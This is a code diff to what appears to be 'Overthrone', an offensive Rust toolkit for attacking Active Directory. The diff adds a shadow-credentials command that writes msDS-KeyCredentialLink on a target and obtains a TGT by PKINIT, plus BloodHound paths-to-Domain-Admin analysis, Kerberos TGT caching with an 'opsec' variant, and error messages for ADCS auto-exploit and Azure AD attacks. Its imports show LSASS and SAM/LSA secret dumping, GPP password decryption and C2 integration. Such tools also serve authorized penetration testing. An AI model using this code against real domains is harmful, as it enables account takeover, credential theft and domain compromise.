@@ -3,15 +3,16 @@
 use crate::auth::Credentials;
 use crate::banner;
 use crate::{
-    AdcsAction, AzureAction, C2Action, Cli, CrackMode, DumpLsassMethod, DumpSource, ForgeAction,
-    MoveAction, OutputFormat, PluginAction, ReportFormat, ScanType, SccmAction, SccmTechnique,
-    SecretsAction, ShellType,
+    AdcsAction, AzureAction, BloodHoundAction, C2Action, Cli, CrackMode, DumpLsassMethod,
+    DumpSource, ForgeAction, MoveAction, OutputFormat, PluginAction, ReportFormat, ScanType,
+    SccmAction, SccmTechnique, SecretsAction, ShadowCredAction, ShellType,
 };
 use colored::Colorize;
 use kerberos_asn1::Asn1Object;
 use overthrone_core::c2::{C2Auth, C2Config, C2Framework, C2Manager};
 use overthrone_core::crypto::gpp::{decrypt_gpp_password, parse_gpp_xml};
 use overthrone_core::graph::AttackGraph;
+use overthrone_core::graph::queries::GraphAnalysisEngine;
 use overthrone_core::plugin::{PluginContext, PluginRegistry};
 use overthrone_core::proto::rid::{RidAccountType, RidCycleConfig, rid_cycle};
 use overthrone_core::proto::secretsdump::{dump_dcc2, dump_lsa, dump_sam};
@@ -25,7 +26,7 @@ use overthrone_reaper::laps::enumerate_laps;
 use overthrone_reaper::runner::ReaperConfig;
 use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
-use tracing::warn;
+use tracing::{debug, warn};
 
 // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 // Output helpers
@@ -550,6 +551,24 @@ pub async fn cmd_report(_cli: &Cli, input: &str, output: &str, format: ReportFor
                 pdf_bytes.len() as f64 / 1024.0,
                 session.findings.len()
             );
+        }
+        ReportFormat::Xlsx => {
+            println!("  {} Generating XLSX report...", ">".bright_black());
+            let output_path = std::path::Path::new(output);
+            match overthrone_scribe::generate_xlsx_report(&session, output_path) {
+                Ok(()) => {
+                    println!(
+                        "  {} XLSX generated ({}, {} findings)",
+                        "[+]".green(),
+                        output,
+                        session.findings.len()
+                    );
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("XLSX generation failed: {}", e));
+                    return 1;
+                }
+            }
         }
     }
 
@@ -2694,6 +2713,761 @@ pub async fn cmd_laps(cli: &Cli, computer: Option<&str>) -> i32 {
     }
 }
 
+// ═══════════════════════════════════════════════════════════
+// cmd_shadow_cred — Shadow Credential Lifecycle
+// ═══════════════════════════════════════════════════════════
+
+#[cfg(feature = "reaper")]
+pub async fn cmd_shadow_cred(cli: &Cli, action: &ShadowCredAction) -> i32 {
+    banner::print_module_banner("SHADOW CREDENTIALS");
+
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+    let dc = match crate::require_dc(cli) {
+        Ok(d) => d,
+        Err(e) => return e,
+    };
+    let domain = match cli.domain.as_deref() {
+        Some(d) => d.to_string(),
+        None => {
+            banner::print_fail("--domain is required");
+            return 1;
+        }
+    };
+
+    let mut ldap = if let Some(hash) = creds.nthash() {
+        match overthrone_core::proto::ldap::LdapSession::connect_with_hash(
+            &dc,
+            &domain,
+            &creds.username,
+            hash,
+            false,
+        )
+        .await
+        {
+            Ok(s) => s,
+            Err(e) => {
+                banner::print_fail(&format!("LDAP connect failed: {e}"));
+                return 1;
+            }
+        }
+    } else {
+        match overthrone_core::proto::ldap::LdapSession::connect(
+            &dc,
+            &domain,
+            &creds.username,
+            creds.password().unwrap_or(""),
+            false,
+        )
+        .await
+        {
+            Ok(s) => s,
+            Err(e) => {
+                banner::print_fail(&format!("LDAP connect failed: {e}"));
+                return 1;
+            }
+        }
+    };
+
+    match action {
+        ShadowCredAction::Add {
+            target,
+            key_size,
+            validity_hours,
+        } => {
+            let target_dn = match resolve_shadow_target_dn(&mut ldap, target, &domain).await {
+                Ok(dn) => dn,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+            println!(
+                "  {} Target: {} ({})",
+                ">".bright_black(),
+                target.cyan(),
+                target_dn.dimmed()
+            );
+            println!("  {} Key size: {} bits", ">".bright_black(), key_size);
+            println!(
+                "  {} Validity: {} hours",
+                ">".bright_black(),
+                validity_hours
+            );
+
+            match overthrone_core::postex::cves::exploit_shadow_credentials(
+                &mut ldap, &dc, &domain, &target_dn,
+            )
+            .await
+            {
+                Ok(result) => {
+                    banner::print_success("Shadow credential added and PKINIT auth succeeded");
+                    println!(
+                        "  {} Certificate: {} bytes",
+                        ">".bright_black(),
+                        result.certificate.len()
+                    );
+                    println!(
+                        "  {} Private key: {} bytes",
+                        ">".bright_black(),
+                        result.private_key.len()
+                    );
+                    println!("  {} TGT: {} bytes", ">".bright_black(), result.tgt.len());
+                    println!(
+                        "  {} Run ovt shadow-cred remove {} --key-id <ID> or ovt shadow-cred clear {} to clean up",
+                        "!".yellow(),
+                        target.cyan(),
+                        target.cyan(),
+                    );
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!(
+                        "Shadow credential attack on {target} failed: {e}"
+                    ));
+                    1
+                }
+            }
+        }
+
+        ShadowCredAction::List { target } => {
+            let target_dn = match resolve_shadow_target_dn(&mut ldap, target, &domain).await {
+                Ok(dn) => dn,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+            println!(
+                "  {} Reading msDS-KeyCredentialLink on: {}",
+                ">".bright_black(),
+                target_dn.cyan()
+            );
+
+            match ldap
+                .read_attribute(&target_dn, "msDS-KeyCredentialLink")
+                .await
+            {
+                Ok(values) => {
+                    if values.is_empty() {
+                        println!(
+                            "  {} No shadow credentials found on {}",
+                            "!".yellow(),
+                            target.cyan()
+                        );
+                        return 0;
+                    }
+                    let creds =
+                        overthrone_forge::shadow_credentials::parse_key_credentials(&values);
+                    println!(
+                        "  {} Found {} key credential(s):",
+                        "[+]".green(),
+                        creds.len()
+                    );
+                    for (i, cred) in creds.iter().enumerate() {
+                        println!(
+                            "    {}. KeyId: {}  Created: {}",
+                            i + 1,
+                            cred.key_id.yellow(),
+                            cred.created
+                                .format("%Y-%m-%d %H:%M:%S UTC")
+                                .to_string()
+                                .dimmed()
+                        );
+                    }
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to read KeyCredentialLink: {e}"));
+                    1
+                }
+            }
+        }
+
+        ShadowCredAction::Remove { target, key_id } => {
+            let target_dn = match resolve_shadow_target_dn(&mut ldap, target, &domain).await {
+                Ok(dn) => dn,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+            println!("  {} Target: {}", ">".bright_black(), target_dn.cyan());
+            println!(
+                "  {} KeyId to remove: {}",
+                ">".bright_black(),
+                key_id.yellow()
+            );
+
+            let values = match ldap
+                .read_attribute(&target_dn, "msDS-KeyCredentialLink")
+                .await
+            {
+                Ok(v) => v,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to read KeyCredentialLink: {e}"));
+                    return 1;
+                }
+            };
+
+            let creds = overthrone_forge::shadow_credentials::parse_key_credentials(&values);
+            let matching: Vec<String> = values
+                .iter()
+                .enumerate()
+                .filter(|(i, _)| creds.get(*i).map(|c| c.key_id == *key_id).unwrap_or(false))
+                .map(|(_, v)| v.clone())
+                .collect();
+
+            if matching.is_empty() {
+                banner::print_fail(&format!("No credential with KeyId '{key_id}' found"));
+                return 1;
+            }
+
+            match ldap
+                .modify_delete_values(&target_dn, "msDS-KeyCredentialLink", &matching)
+                .await
+            {
+                Ok(_) => {
+                    banner::print_success(&format!("Removed credential with KeyId '{key_id}'"));
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to remove credential from {target}: {e}"));
+                    1
+                }
+            }
+        }
+
+        ShadowCredAction::Clear { target, force } => {
+            let target_dn = match resolve_shadow_target_dn(&mut ldap, target, &domain).await {
+                Ok(dn) => dn,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+            println!("  {} Target: {}", ">".bright_black(), target_dn.cyan());
+
+            if !force {
+                match ldap
+                    .read_attribute(&target_dn, "msDS-KeyCredentialLink")
+                    .await
+                {
+                    Ok(values) => {
+                        if values.is_empty() {
+                            println!("  {} No shadow credentials to clear", "!".yellow());
+                            return 0;
+                        }
+                        println!(
+                            "  {} Will remove ALL {} credential(s). Use --force to skip confirmation.",
+                            "!".yellow(),
+                            values.len()
+                        );
+                    }
+                    Err(_) => {
+                        println!("  {} Unable to read current credentials.", "!".yellow());
+                    }
+                }
+            }
+
+            match ldap
+                .modify_delete(&target_dn, "msDS-KeyCredentialLink")
+                .await
+            {
+                Ok(_) => {
+                    banner::print_success("All shadow credentials cleared");
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to clear credentials on {target}: {e}"));
+                    1
+                }
+            }
+        }
+    }
+}
+
+/// Resolve a target identifier to an LDAP distinguished name.
+async fn resolve_shadow_target_dn(
+    ldap: &mut overthrone_core::proto::ldap::LdapSession,
+    target: &str,
+    domain: &str,
+) -> std::result::Result<String, String> {
+    if target.starts_with("CN=") || target.starts_with("DC=") || target.starts_with("OU=") {
+        return Ok(target.to_string());
+    }
+    let base_dn = overthrone_reaper::runner::ReaperConfig::base_dn_from_domain(domain);
+    let filter = format!("(|(sAMAccountName={target})(userPrincipalName={target}))");
+    let entries = ldap
+        .custom_search_with_base(&base_dn, &filter, &["distinguishedName"])
+        .await
+        .map_err(|e| format!("LDAP search failed: {e}"))?;
+    entries
+        .first()
+        .and_then(|e| e.attrs.get("distinguishedName"))
+        .and_then(|v| v.first())
+        .cloned()
+        .ok_or_else(|| format!("Target '{target}' not found in domain {domain}"))
+}
+
+// ═══════════════════════════════════════════════════════════
+// cmd_bloodhound — BloodHound Attack Path Analysis
+// ═══════════════════════════════════════════════════════════
+
+fn load_graph_from(path: &str) -> std::result::Result<overthrone_core::graph::AttackGraph, String> {
+    match overthrone_core::graph::AttackGraph::from_json_file(path) {
+        Ok(g) => Ok(g),
+        Err(e) => Err(format!("Failed to load graph from {path}: {e}")),
+    }
+}
+
+#[cfg(feature = "reaper")]
+pub async fn cmd_bloodhound(_cli: &Cli, action: &BloodHoundAction) -> i32 {
+    banner::print_module_banner("BLOODHOUND");
+
+    match action {
+        BloodHoundAction::Import { dir, output } => {
+            let path = std::path::Path::new(dir);
+            if !path.is_dir() {
+                banner::print_fail(&format!("Not a directory: {dir}"));
+                return 1;
+            }
+            println!(
+                "  {} Importing BloodHound data from: {}",
+                ">".bright_black(),
+                dir.cyan()
+            );
+            match overthrone_core::graph::bh_import::import_bloodhound_dir(path) {
+                Ok(graph) => {
+                    let stats = graph.stats();
+                    banner::print_success(&format!(
+                        "Imported {} nodes, {} edges",
+                        stats.total_nodes, stats.total_edges
+                    ));
+                    println!(
+                        "    Users: {}  Computers: {}  Groups: {}  Domains: {}  GPOs: {}  OUs: {}",
+                        stats.users,
+                        stats.computers,
+                        stats.groups,
+                        stats.domains,
+                        stats.gpos,
+                        stats.ous
+                    );
+
+                    if let Some(out_path) = output {
+                        let path_str = out_path.clone();
+                        let json = graph.export_json().unwrap_or_default();
+                        match std::fs::write(&path_str, json) {
+                            Ok(_) => {
+                                println!("  {} Graph saved to: {}", "[+]".green(), out_path.cyan())
+                            }
+                            Err(e) => banner::print_fail(&format!("Failed to write graph: {e}")),
+                        }
+                    }
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("BloodHound import from {dir} failed: {e}"));
+                    1
+                }
+            }
+        }
+
+        BloodHoundAction::Path { from, to, graph } => {
+            let graph = match load_graph_from(graph) {
+                Ok(g) => g,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+            match graph.shortest_path(from, to) {
+                Ok(path) => {
+                    banner::print_success("Attack path found:");
+                    println!("  {from} -> {to}");
+                    println!("  Total cost: {}", path.total_cost);
+                    println!("  Hops: {}", path.hop_count);
+                    println!();
+                    for hop in &path.hops {
+                        println!(
+                            "    {} {} --[{}]--> {}",
+                            ">".bright_black(),
+                            hop.source.cyan(),
+                            format!("{:?}", hop.edge).yellow(),
+                            hop.target.cyan()
+                        );
+                    }
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("No path from {from} to {to}: {e}"));
+                    1
+                }
+            }
+        }
+
+        BloodHoundAction::PathToDa { from, graph } => {
+            let g = match load_graph_from(graph) {
+                Ok(g) => g,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+            let domain = from.split('@').nth(1).unwrap_or("UNKNOWN");
+            let paths = g.paths_to_da(from, domain);
+            if paths.is_empty() {
+                println!(
+                    "  {} No path from {} to Domain Admin found",
+                    "!".yellow(),
+                    from.cyan()
+                );
+                return 0;
+            }
+            banner::print_success(&format!(
+                "Found {} path(s) from {} to Domain Admin",
+                paths.len(),
+                from
+            ));
+            for (i, p) in paths.iter().enumerate() {
+                println!(
+                    "  Path #{} (cost: {}, hops: {}):",
+                    i + 1,
+                    p.total_cost,
+                    p.hop_count
+                );
+                for hop in &p.hops {
+                    println!(
+                        "    {} {} --[{}]--> {}",
+                        ">".bright_black(),
+                        hop.source.cyan(),
+                        format!("{:?}", hop.edge).yellow(),
+                        hop.target.cyan()
+                    );
+                }
+                println!();
+            }
+            0
+        }
+
+        BloodHoundAction::Stats { graph } => {
+            let g = match load_graph_from(graph) {
+                Ok(g) => g,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+            let stats = g.stats();
+            println!("  {} Graph Statistics:", ">".bright_black());
+            println!(
+                "    Total nodes: {}",
+                stats.total_nodes.to_string().yellow()
+            );
+            println!(
+                "    Total edges: {}",
+                stats.total_edges.to_string().yellow()
+            );
+            println!("    Users:      {}", stats.users);
+            println!("    Computers:  {}", stats.computers);
+            println!("    Groups:     {}", stats.groups);
+            println!("    Domains:    {}", stats.domains);
+            println!("    GPOs:       {}", stats.gpos);
+            println!("    OUs:        {}", stats.ous);
+            if !stats.edge_type_counts.is_empty() {
+                println!();
+                println!("  {} Edge distribution:", ">".bright_black());
+                let mut sorted: Vec<_> = stats.edge_type_counts.iter().collect();
+                sorted.sort_by(|a, b| b.1.cmp(a.1));
+                for (edge, count) in sorted.iter().take(15) {
+                    println!("    {:40} {}", edge.cyan(), count.to_string().yellow());
+                }
+            }
+            0
+        }
+
+        BloodHoundAction::Reachable { from, graph } => {
+            let g = match load_graph_from(graph) {
+                Ok(g) => g,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+            let domain = from.split('@').nth(1).unwrap_or("UNKNOWN");
+            let da_paths = g.paths_to_da(from, domain);
+            let mut all: Vec<String> = Vec::new();
+            for p in &da_paths {
+                for hop in &p.hops {
+                    if !all.contains(&hop.target) {
+                        all.push(hop.target.clone());
+                    }
+                }
+            }
+            if all.is_empty() {
+                println!(
+                    "  {} Nothing reachable from {} found",
+                    "!".yellow(),
+                    from.cyan()
+                );
+            } else {
+                println!(
+                    "  {} Reachable targets from {}:",
+                    "[+]".green(),
+                    from.cyan()
+                );
+                for (i, t) in all.iter().enumerate() {
+                    println!("    {}. {}", i + 1, t.cyan());
+                }
+            }
+            0
+        }
+
+        BloodHoundAction::HighValue { top, graph } => {
+            let g = match load_graph_from(graph) {
+                Ok(g) => g,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+            let targets = g.high_value_targets(*top);
+            if targets.is_empty() {
+                println!("  {} No high-value targets found", "!".yellow());
+            } else {
+                println!("  {} Top {} high-value targets:", "[+]".green(), top);
+                for (i, (name, node_type, degree)) in targets.iter().enumerate() {
+                    println!(
+                        "    {}. {:50} {:15} degree={}",
+                        i + 1,
+                        name.cyan(),
+                        format!("{:?}", node_type).dimmed(),
+                        degree.to_string().yellow()
+                    );
+                }
+            }
+            0
+        }
+
+        BloodHoundAction::Analyze {
+            graph,
+            domain,
+            limit,
+            output,
+        } => {
+            let g = match load_graph_from(graph) {
+                Ok(g) => g,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+            let engine = GraphAnalysisEngine::new(&g);
+            let report = engine.analyze_all(domain);
+
+            let mut findings_by_severity: std::collections::BTreeMap<
+                String,
+                Vec<&overthrone_core::graph::queries::AnalysisFinding>,
+            > = std::collections::BTreeMap::new();
+            for finding in &report.findings {
+                findings_by_severity
+                    .entry(format!("{:?}", finding.severity))
+                    .or_default()
+                    .push(finding);
+            }
+
+            let total_findings: usize = report.findings.len();
+            let total_paths: usize = report.cheapest_da_paths.len();
+            println!(
+                "  {} BloodHound Analysis Report for {}",
+                "[+]".green(),
+                domain.bright_cyan()
+            );
+            println!("  {}", "=".repeat(60));
+            println!(
+                "  Produced {} findings, {} DA paths",
+                total_findings.to_string().yellow(),
+                total_paths.to_string().yellow()
+            );
+            println!();
+
+            let sev_order = ["Critical", "High", "Medium", "Low"];
+            for sev in &sev_order {
+                if let Some(findings) = findings_by_severity.get(*sev) {
+                    let header = match *sev {
+                        "Critical" => format!("  {} Critical:", "[CRIT]".bright_red()),
+                        "High" => format!("  {} High:", "[HIGH]".red()),
+                        "Medium" => format!("  {} Medium:", "[MED]".yellow()),
+                        _ => format!("  {} Low:", "[LOW]".dimmed()),
+                    };
+                    println!("{header}");
+                    for finding in findings {
+                        println!(
+                            "    {} {}",
+                            ">".bright_black(),
+                            finding.title.bright_white()
+                        );
+                        println!("      Description: {}", finding.description);
+                        if let Some(ref remediation) = finding.remediation {
+                            println!("      Remediation: {remediation}");
+                        }
+                        println!();
+                    }
+                }
+            }
+
+            if !report.cheapest_da_paths.is_empty() {
+                println!("  {} Cheapest DA Paths (top {}):", "[+]".green(), limit);
+                for (i, path) in report.cheapest_da_paths.iter().take(*limit).enumerate() {
+                    println!(
+                        "  Path #{} (cost: {}, hops: {}):",
+                        i + 1,
+                        path.total_cost,
+                        path.hop_count
+                    );
+                    for hop in &path.hops {
+                        println!(
+                            "    {} {} --[{}]--> {}",
+                            ">".bright_black(),
+                            hop.source.cyan(),
+                            format!("{:?}", hop.edge).yellow(),
+                            hop.target.cyan()
+                        );
+                    }
+                    println!();
+                }
+            }
+
+            if let Some(out_path) = output {
+                match serde_json::to_string_pretty(&report) {
+                    Ok(json) => match std::fs::write(out_path, json) {
+                        Ok(_) => {
+                            println!("  {} Report saved to: {}", "[+]".green(), out_path.cyan())
+                        }
+                        Err(e) => banner::print_fail(&format!("Failed to write report: {e}")),
+                    },
+                    Err(e) => banner::print_fail(&format!("Failed to serialize report: {e}")),
+                }
+            }
+
+            0
+        }
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+// cmd_assess — Domain Risk Assessment
+// ═══════════════════════════════════════════════════════════
+
+#[cfg(feature = "reaper")]
+pub async fn cmd_assess(cli: &Cli, _modules: &[String]) -> i32 {
+    banner::print_module_banner("RISK ASSESSMENT");
+
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+    let dc = match crate::require_dc(cli) {
+        Ok(d) => d,
+        Err(e) => return e,
+    };
+
+    let config = overthrone_reaper::ReaperConfig {
+        dc_ip: dc.clone(),
+        domain: creds.domain.clone(),
+        base_dn: overthrone_reaper::ReaperConfig::base_dn_from_domain(&creds.domain),
+        username: creds.username.clone(),
+        password: creds.password().map(str::to_string),
+        nt_hash: creds.nthash().map(str::to_string),
+        modules: vec![],
+        page_size: 500,
+        use_ldaps: false,
+    };
+
+    println!(
+        "  {} Running domain enumeration for risk assessment...",
+        ">".bright_black()
+    );
+    match overthrone_reaper::run_reaper(&config).await {
+        Ok(result) => {
+            let assessment = overthrone_reaper::assess_reaper_result(&result);
+            println!();
+            println!(
+                "  {} Domain: {}",
+                ">".bright_black(),
+                assessment.domain.cyan()
+            );
+            println!(
+                "  {} Overall Health Score: {}/100 ({})",
+                ">".bright_black(),
+                format!("{:.0}", assessment.overall_health_score)
+                    .yellow()
+                    .bold(),
+                assessment.overall_health_label.green()
+            );
+            println!();
+            println!("  {} Risk Summary:", ">".bright_black());
+            println!(
+                "    {} Critical: {}  High: {}  Medium: {}  Low: {}  Info: {}",
+                "!".red(),
+                assessment.critical_count.to_string().red(),
+                assessment.high_count.to_string().yellow(),
+                assessment.medium_count.to_string().dimmed(),
+                assessment.low_count,
+                assessment.info_count
+            );
+            println!();
+            println!("  {} Category Scores:", ">".bright_black());
+            for cat_score in &assessment.category_scores {
+                if cat_score.finding_count == 0 {
+                    continue;
+                }
+                let pct = format!("{:.0}", cat_score.score);
+                let bar = if cat_score.score >= 80.0 {
+                    pct.green()
+                } else if cat_score.score >= 60.0 {
+                    pct.yellow()
+                } else {
+                    pct.red()
+                };
+                println!(
+                    "    {:25} {}  ({} finding(s))",
+                    cat_score.label.bright_black(),
+                    bar,
+                    cat_score.finding_count
+                );
+            }
+            if !assessment.findings.is_empty() {
+                println!();
+                println!("  {} Detailed Findings:", ">".bright_black());
+                for finding in &assessment.findings {
+                    let sev = match finding.severity.numeric() {
+                        5 => "[CRIT]".red().bold(),
+                        4 => "[HIGH]".yellow().bold(),
+                        3 => "[MED]".yellow(),
+                        2 => "[LOW]".dimmed(),
+                        _ => "[INFO]".bright_black(),
+                    };
+                    println!(
+                        "    {} {}: {}",
+                        sev,
+                        finding.title.cyan(),
+                        finding.description.dimmed()
+                    );
+                }
+            }
+            0
+        }
+        Err(e) => {
+            let domain = &creds.domain;
+            banner::print_fail(&format!("Risk assessment for {dc} ({domain}) failed: {e}"));
+            1
+        }
+    }
+}
+
 // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // cmd_secrets â€” Secrets Dumping
 // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
@@ -4159,7 +4933,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             let mut report = match scanner.scan().await {
                 Ok(r) => r,
                 Err(e) => {
-                    banner::print_fail(&format!("ADCS scan failed: {e}"));
+                    banner::print_fail(&format!("ADCS ESC scan for {domain} failed: {e}"));
                     return 1;
                 }
             };
@@ -4246,7 +5020,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                         }
                     }
                     Err(e) => {
-                        banner::print_fail(&format!("Auto-exploit failed: {e}"));
+                        banner::print_fail(&format!("ADCS auto-exploit for {domain} failed: {e}"));
                         return 1;
                     }
                 }
@@ -5278,7 +6052,9 @@ pub async fn cmd_azure(cli: &Cli, action: &AzureAction) -> i32 {
                     if result.success { 0 } else { 1 }
                 }
                 Err(e) => {
-                    banner::print_fail(&format!("Azure AD attack failed: {e}"));
+                    banner::print_fail(&format!(
+                        "Azure AD attack on {dc_ip} ({domain}) failed: {e}"
+                    ));
                     if let Err(e) = ldap.disconnect().await {
                         warn!("LDAP disconnect: {e}");
                     }
@@ -5287,8 +6063,76 @@ pub async fn cmd_azure(cli: &Cli, action: &AzureAction) -> i32 {
             }
         }
         Err(e) => {
-            banner::print_fail(&format!("Failed to connect to LDAP: {e}"));
+            banner::print_fail(&format!(
+                "Failed to connect to LDAP on {dc_ip} for {domain}: {e}"
+            ));
             1
         }
     }
+}
+
+/// Request a TGT with cache-first logic.
+/// Checks the credential cache first; if a valid (non-expired) TGT exists,
+/// returns it without contacting the KDC. Otherwise requests a fresh TGT
+/// from the KDC and saves it to the cache.
+///
+/// Pass `refresh: true` to bypass the cache and force a fresh request.
+pub async fn get_cached_tgt(
+    dc: &str,
+    domain: &str,
+    username: &str,
+    secret: &str,
+    use_hash: bool,
+    refresh: bool,
+) -> Result<overthrone_core::proto::kerberos::TicketGrantingData, String> {
+    let cache = overthrone_core::cred_cache::CredCache::new();
+
+    // Check cache first (unless refresh requested)
+    if !refresh && let Some(tgt) = cache.load_tgt(domain, username) {
+        debug!("Using cached TGT for {username}@{domain}");
+        return Ok(tgt);
+    }
+
+    // Request fresh TGT from KDC
+    let tgt = overthrone_core::proto::kerberos::request_tgt(dc, domain, username, secret, use_hash)
+        .await
+        .map_err(|e| format!("TGT request failed: {e}"))?;
+
+    // Save to cache (best-effort — ignore save errors)
+    if let Err(e) = cache.save_tgt(&tgt) {
+        debug!("Failed to cache TGT: {e}");
+    }
+
+    Ok(tgt)
+}
+
+/// Request a TGT with cache-first logic, using opsec options.
+#[allow(dead_code)]
+pub async fn get_cached_tgt_opsec(
+    dc: &str,
+    domain: &str,
+    username: &str,
+    secret: &str,
+    use_hash: bool,
+    refresh: bool,
+    options: &overthrone_core::proto::kerberos::RequestTgtOptions,
+) -> Result<overthrone_core::proto::kerberos::TicketGrantingData, String> {
+    let cache = overthrone_core::cred_cache::CredCache::new();
+
+    if !refresh && let Some(tgt) = cache.load_tgt(domain, username) {
+        debug!("Using cached TGT for {username}@{domain}");
+        return Ok(tgt);
+    }
+
+    let tgt = overthrone_core::proto::kerberos::request_tgt_opsec(
+        dc, domain, username, secret, use_hash, options,
+    )
+    .await
+    .map_err(|e| format!("TGT request failed: {e}"))?;
+
+    if let Err(e) = cache.save_tgt(&tgt) {
+        debug!("Failed to cache TGT: {e}");
+    }
+
+    Ok(tgt)
 }
